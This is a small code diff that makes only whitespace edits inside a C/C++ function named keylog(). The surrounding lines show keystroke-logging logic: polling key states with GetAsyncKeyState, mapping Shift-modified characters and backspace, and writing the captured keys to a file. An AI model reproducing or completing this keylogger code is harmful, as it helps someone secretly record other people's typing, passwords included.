@@ -35,7 +35,6 @@ void keylog(){
 					write.close();
 					break;
 				}
-
 				// Special Symbols key
 				else{
 					switch (key){
@@ -78,7 +77,7 @@ void keylog(){
 						case 57:
 							(GetAsyncKeyState(0x10)?write << "(":write << key);
 							break;
-
+							
 						// Special Symbols Virtual Key 
 						case VK_BACK:
 							write << "<BS>";  //backspace (0x08)
